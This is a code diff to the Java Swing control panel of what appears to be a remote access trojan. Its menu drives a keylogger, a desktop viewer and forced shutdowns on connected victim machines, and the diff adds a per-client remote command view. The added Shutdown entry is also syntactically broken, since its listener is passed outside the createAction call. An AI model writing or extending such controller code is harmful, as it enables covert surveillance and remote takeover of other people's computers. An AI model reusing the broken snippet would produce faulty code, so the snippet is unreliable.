@@ -87,22 +87,6 @@ public class GuiMain extends JFrame {
         JPopupMenu jPopupMenu = new JPopupMenu();
         jPopupMenu.add(createAction("INFO", MessageType.HARDWARE_INFO));
         jPopupMenu.add(createAction("Alt F4", MessageType.ALTF4));
-        jPopupMenu.add(createAction("Message Box", MessageType.MESSAGE_BOX, new ActionListener() {
-
-            @Override
-            public void actionPerformed(ActionEvent arg0) {
-
-            }
-
-        }));
-        jPopupMenu.add(createAction("Bot Net", MessageType.ALTF4, new ActionListener() {
-
-            @Override
-            public void actionPerformed(ActionEvent arg0) {
-
-            }
-
-        }));
         jPopupMenu.add(createAction("Desktop Viewer", MessageType.DESKTOP, new ActionListener() {
 
             @Override
@@ -113,6 +97,14 @@ public class GuiMain extends JFrame {
             }
 
         }));
+        jPopupMenu.add(createAction("Command", MessageType.COMMAND, new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                for (ConnectedClient cc : clientList.getSelectedValuesList()) {
+                    cc.openCommandView();
+                }
+            }
+        }));
         jPopupMenu.add(createAction("Key Logger", MessageType.KEYLOGGER, new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent arg0) {
@@ -122,14 +114,14 @@ public class GuiMain extends JFrame {
             }
 
         }));
-        jPopupMenu.add(createAction("Shutdown", MessageType.SHUTDOWN));
-        jPopupMenu.add(createAction("Open URL", MessageType.SHUTDOWN, new ActionListener() {
+        jPopupMenu.add(createAction("Shutdown", MessageType.SHUTDOWN), new ActionListener() {
             @Override
-            public void actionPerformed(ActionEvent arg0) {
-
+            public void actionPerformed(ActionEvent e) {
+                for (ConnectedClient cc : clientList.getSelectedValuesList()) {
+                    cc.SendShutDown(cc.getPrintWriter());
+                }
             }
-
-        }));
+        });
 
         clientList.addMouseListener(new MouseAdapter() {
             public void mousePressed(MouseEvent e)  {check(e);}
